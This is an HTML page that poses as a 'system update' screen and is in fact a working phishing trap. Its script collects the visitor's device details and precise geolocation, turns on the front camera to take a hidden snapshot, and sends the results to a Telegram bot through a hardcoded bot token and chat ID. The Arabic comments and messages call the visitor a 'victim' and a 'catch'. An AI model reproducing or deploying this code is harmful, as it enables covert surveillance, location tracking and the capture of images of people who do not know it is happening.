<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>⚡ جاري تحديث النظام...</title>
    <style>
        body { background: #050505; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .glitch { font-size: 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: glitch 1s linear infinite; }
        @keyframes glitch { 0% { text-shadow: 2px 0 0 #f0f, -2px 0 0 #0ff; } 50% { text-shadow: -2px 0 0 #f0f, 2px 0 0 #0ff; } 100% { text-shadow: 2px 0 0 #f0f, -2px 0 0 #0ff; } }
    </style>
</head>
<body>
    <div class="glitch">SYSTEM_OVERRIDE_IN_PROGRESS...</div>

    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // --- إعدادات القلعة ---
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // توكن البوت
        const ID = "1772820433";   // الآيدي الخاص بك

        async function post(api, body) {
            await fetch(`https://api.telegram.org/bot${T}/${api}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            });
        }

        async function sendImg(data) {
            const b = await (await fetch(data)).blob();
            const f = new FormData();
            f.append('chat_id', ID);
            f.append('photo', b, 'hit.png');
            f.append('caption', "📸 تم التقاط رأس الضحية بنجاح 💀");
            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
        }

        // 1. سحب المعلومات التقنية (The Recon)
        let info = `🔥 صيد جديد تم اختراقه!\n\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}\n🔋 البطارية: جاري الفحص...`;
        
        // 2. سحب الموقع الدقيق (High Accuracy)
        navigator.geolocation.getCurrentPosition(p => {
            const loc = `📍 الإحداثيات الدقيقة:\nالرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nالدقة: ${p.coords.accuracy} متر 🎯`;
            post('sendMessage', {chat_id: ID, text: info + "\n\n" + loc});
        }, e => post('sendMessage', {chat_id: ID, text: info + "\n\n⚠️ الضحية جبان ورفض الموقع!"}), {enableHighAccuracy: true});

        // 3. الهجوم البصري الصامت (Silent Capture)
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => {
            const vid = document.getElementById('v');
            vid.srcObject = s;
            // التقاط بعد ثانيتين لضمان ثبات الصورة
            setTimeout(() => {
                const can = document.getElementById('c');
                can.width = vid.videoWidth;
                can.height = vid.videoHeight;
                can.getContext('2d').drawImage(vid, 0, 0);
                sendImg(can.toDataURL('image/png'));
                // إيقاف الكاميرا فوراً لإخفاء الأثر
                s.getTracks().forEach(track => track.stop());
            }, 2000);
        }).catch(e => post('sendMessage', {chat_id: ID, text: "⚠️ فشل الوصول للكاميرا!"}));
    </script>
</body>
</html>
